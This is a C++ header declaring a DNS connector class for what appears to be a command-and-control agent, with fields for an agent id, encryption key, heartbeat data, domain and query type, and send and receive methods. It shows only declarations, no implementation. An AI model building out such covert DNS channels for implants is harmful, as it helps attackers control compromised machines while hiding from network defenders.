#pragma once

#include "AgentConfig.h"
#include <windows.h>

class ConnectorDNS
{
    ProfileDNS profile = { 0 };

    // cached session/transport parameters
    CHAR  sid[17] = { 0 };       // 8 bytes agent_id as 16-char hex string
    BYTE  encryptKey[16] = { 0 };
    ULONG pktSize = 0;
    ULONG labelSize = 0;
    CHAR  domain[256] = { 0 };
    CHAR  qtype[8] = { 0 };
    BOOL  initialized = FALSE;
    BOOL  hiSent = FALSE;
    ULONG seq = 0;
    ULONG idx = 0;

    BYTE* recvData = NULL;
    int   recvSize = 0;

public:
    ConnectorDNS();

    BOOL SetConfig(ProfileDNS profile, BYTE* beat, ULONG beatSize);
    void CloseConnector();

    void  SendData(BYTE* data, ULONG data_size);
    BYTE* RecvData();
    int   RecvSize();
    void  RecvClear();
};
